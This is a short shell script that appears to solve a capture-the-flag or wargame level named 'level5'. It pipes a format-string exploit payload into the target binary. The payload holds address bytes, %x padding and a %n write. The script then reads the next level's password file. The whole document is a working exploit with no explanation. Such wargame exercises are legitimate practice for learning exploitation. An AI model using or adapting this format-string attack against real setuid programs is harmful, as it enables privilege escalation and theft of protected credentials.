#!/bin/sh

(python -c 'print("\x38\x98\x04\x08"+"A"+"%.44837941x"*3+"%n\n")'; cat -) | ./level5
echo "Flag is: `cat /home/user/level6/.pass`"

exit 0
